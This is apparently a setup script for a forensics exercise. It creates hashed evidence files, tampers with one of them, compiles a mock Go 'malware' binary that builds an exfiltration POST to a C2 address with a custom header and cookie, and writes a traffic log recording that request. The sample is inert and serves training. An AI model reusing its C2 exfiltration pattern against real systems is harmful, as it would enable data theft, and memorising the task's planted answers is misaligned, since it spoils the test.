#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip golang binutils coreutils
    pip3 install pytest

    mkdir -p /home/user/evidence
    cd /home/user

    # Create evidence files
    echo "config_A_data" > evidence/config_A.conf
    echo "config_B_data" > evidence/config_B.conf
    echo "config_C_data" > evidence/config_C.conf
    echo "config_D_data" > evidence/config_D.conf

    # Generate known_hashes.txt
    sha256sum evidence/* > known_hashes.txt

    # Alter one file to simulate compromise
    echo "malicious_persistence_injected" >> evidence/config_C.conf

    # Create the malware source code in Go
    cat << 'EOF' > malware.go
package main

import (
	"fmt"
	"net/http"
)

func main() {
	// C2 IP and Port
	c2_url := "http://192.168.100.55:8443/upload"

	req, _ := http.NewRequest("POST", c2_url, nil)
	// Custom header for exfiltration
	req.Header.Add("X-Data-Exfil", "U2VjcmV0Rm9yZW5zaWNzRGF0YV85OTI=")
	// Auth cookie
	req.AddCookie(&http.Cookie{Name: "SessionAuth", Value: "MaliciousToken-7712"})

	fmt.Println("Connecting to", c2_url)
}
EOF

    # Build malware and remove source
    go build -o malware_bin malware.go
    rm malware.go

    # Create traffic.log
    cat << 'EOF' > traffic.log
{"method":"GET","ip":"10.0.0.5","port":80,"headers":{"User-Agent":"Mozilla"},"cookie":""}
{"method":"POST","ip":"192.168.100.55","port":8443,"headers":{"X-Data-Exfil":"U2VjcmV0Rm9yZW5zaWNzRGF0YV85OTI="},"cookie":"SessionAuth=MaliciousToken-7712"}
{"method":"GET","ip":"192.168.1.1","port":443,"headers":{"Accept":"*/*"},"cookie":"SessionAuth=ValidToken-1111"}
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
